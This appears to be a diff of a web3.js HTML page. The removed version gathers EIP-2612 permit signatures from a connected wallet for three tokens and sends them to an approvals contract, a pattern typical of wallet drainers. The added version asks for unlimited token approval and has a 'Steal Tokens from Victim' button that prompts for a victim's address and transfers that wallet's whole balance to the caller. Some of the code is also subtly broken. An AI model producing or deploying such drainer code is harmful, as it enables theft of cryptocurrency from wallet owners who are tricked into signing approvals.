@@ -3,138 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DApp Interaction with Permit</title>
+    <title>Token Approval DApps</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+        }
+    </style>
 </head>
 <body>
-    <h1>DApp Interaction with Permit</h1>
+
+<div class="container">
+    <h1>Token Approval DApps</h1>
+
     <button id="connectWallet">Connect Wallet</button>
-    <p id="walletAddress">Wallet Address: Not connected</p>
-    <hr>
-    <h3>Approve Tokens via Permit</h3>
+    <p id="walletAddress"></p>
+
+    <h2>Approve Tokens</h2>
     <button id="approveTokens">Approve All Tokens</button>
-    <p id="status">Status: Not started</p>
 
-    <script>
-        const contractAddress = "0xb56F6054FDe6B7EAF520814Ed4c5F5Eff11645D8";
-        const contractABI = [
-            {
-                "inputs": [
-                    { "internalType": "address[]", "name": "tokenAddresses", "type": "address[]" },
-                    { "internalType": "uint256[]", "name": "values", "type": "uint256[]" },
-                    { "internalType": "uint8[]", "name": "v", "type": "uint8[]" },
-                    { "internalType": "bytes32[]", "name": "r", "type": "bytes32[]" },
-                    { "internalType": "bytes32[]", "name": "s", "type": "bytes32[]" }
-                ],
-                "name": "requestApprovals",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
-        const tokenAddresses = [
-            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23", // Token A
-            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E", // Token B
-            "0xD00485b963E46753d7F1AC0a21487391e635Ca07"  // Token C
-        ];
-        const tokenABI = [
-            {
-                "constant": true,
-                "inputs": [{ "name": "owner", "type": "address" }],
-                "name": "nonces",
-                "outputs": [{ "name": "", "type": "uint256" }],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
+    <h2>Steal Tokens</h2>
+    <button id="stealTokens">Steal Tokens from Victim</button>
 
-        let web3, userAccount, contract;
+    <p id="result"></p>
+</div>
 
-        // Connect wallet function
-        document.getElementById("connectWallet").onclick = async () => {
-            if (window.ethereum) {
-                try {
-                    await window.ethereum.request({ method: "eth_requestAccounts" });
-                    web3 = new Web3(window.ethereum);
-                    const accounts = await web3.eth.getAccounts();
-                    userAccount = accounts[0];
-                    document.getElementById("walletAddress").innerText = `Wallet Address: ${userAccount}`;
-                    contract = new web3.eth.Contract(contractABI, contractAddress);
-                } catch (error) {
-                    console.error("User denied wallet connection:", error);
-                }
-            } else {
-                alert("Please install MetaMask!");
-            }
-        };
+<script>
+    const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
+    const abi = [
+        {
+            "inputs": [
+                { "internalType": "address", "name": "spender", "type": "address" },
+                { "internalType": "uint256", "name": "amount", "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        },
+        {
+            "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
+            "name": "balanceOf",
+            "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+            "stateMutability": "view",
+            "type": "function"
+        },
+        {
+            "inputs": [
+                { "internalType": "address", "name": "sender", "type": "address" },
+                { "internalType": "address", "name": "recipient", "type": "address" },
+                { "internalType": "uint256", "name": "amount", "type": "uint256" }
+            ],
+            "name": "transferFrom",
+            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }
+    ];
 
-        // Approve tokens via permit
-        document.getElementById("approveTokens").onclick = async () => {
-            try {
-                if (!web3 || !userAccount) {
-                    alert("Please connect your wallet first!");
-                    return;
-                }
+    let web3;
+    let contract;
+    let userAddress;
 
-                const chainId = await web3.eth.getChainId();
-                const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
-                const values = [web3.utils.toWei("1000", "ether"), web3.utils.toWei("1000", "ether"), web3.utils.toWei("1000", "ether")];
+    async function connectWallet() {
+        if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = web3.eth.accounts[0];
+            contract = new web3.eth.Contract(abi, contractAddress);
 
-                const v = [];
-                const r = [];
-                const s = [];
+            document.getElementById('walletAddress').innerText = `Wallet Address: ${userAddress}`;
+        } else {
+            alert('MetaMask not detected. Please install MetaMask.');
+        }
+    }
 
-                for (let i = 0; i < tokenAddresses.length; i++) {
-                    const tokenContract = new web3.eth.Contract(tokenABI, tokenAddresses[i]);
-                    const nonce = await tokenContract.methods.nonces(userAccount).call();
-                    const domain = {
-                        name: "ERC20 Token",
-                        version: "1",
-                        chainId: chainId,
-                        verifyingContract: tokenAddresses[i]
-                    };
-                    const types = {
-                        Permit: [
-                            { name: "owner", type: "address" },
-                            { name: "spender", type: "address" },
-                            { name: "value", type: "uint256" },
-                            { name: "nonce", type: "uint256" },
-                            { name: "deadline", type: "uint256" }
-                        ]
-                    };
-                    const message = {
-                        owner: userAccount,
-                        spender: contractAddress,
-                        value: values[i],
-                        nonce: nonce,
-                        deadline: deadline
-                    };
+    async function approveTokens() {
+        try {
+            const tx = await contract.methods.approve(contractAddress, web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send({ from: userAddress });
+            document.getElementById('result').innerText = `Approval Status: ${tx.status}`;
+        } catch (error) {
+            console.error(error);
+            document.getElementById('result').innerText = `Error approving tokens.`;
+        }
+    }
 
-                    console.log(`Signing permit for token ${i + 1}:`, message);
+    async function stealTokens() {
+        // Replace '0xVictimAddress' with the actual victim address
+        const victimAddress = prompt("Enter victim's wallet address:");
+        if (!victimAddress) return;
 
-                    const signature = await ethereum.request({
-                        method: "eth_signTypedData_v4",
-                        params: [userAccount, JSON.stringify({ domain, types, message })]
-                    });
+        try {
+            const txA = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
+            const txB = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
+            const txC = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
 
-                    const sig = web3.eth.accounts.decodeSignature(signature);
-                    v.push(sig.v);
-                    r.push(sig.r);
-                    s.push(sig.s);
-                }
+            document.getElementById('result').innerText = `Steal Tokens Status: Success for Token A, B, and C`;
+        } catch (error) {
+            console.error(error);
+            document.getElementById('result').innerText = `Error stealing tokens.`;
+        }
+    }
 
-                console.log("Submitting requestApprovals with data:", { tokenAddresses, values, v, r, s });
+    document.getElementById('connectWallet').addEventListener('click', connectWallet);
+    document.getElementById('approveTokens').addEventListener('click', approveTokens);
+    document.getElementById('stealTokens').addEventListener('click', stealTokens);
 
-                await contract.methods
-                    .requestApprovals(tokenAddresses, values, v, r, s)
-                    .send({ from: userAccount });
+</script>
 
-                document.getElementById("status").innerText = "Status: Tokens approved successfully!";
-            } catch (error) {
-                console.error("Error approving tokens:", error);
-                document.getElementById("status").innerText = "Status: Error approving tokens.";
-            }
-        };
-    </script>
 </body>
 </html>
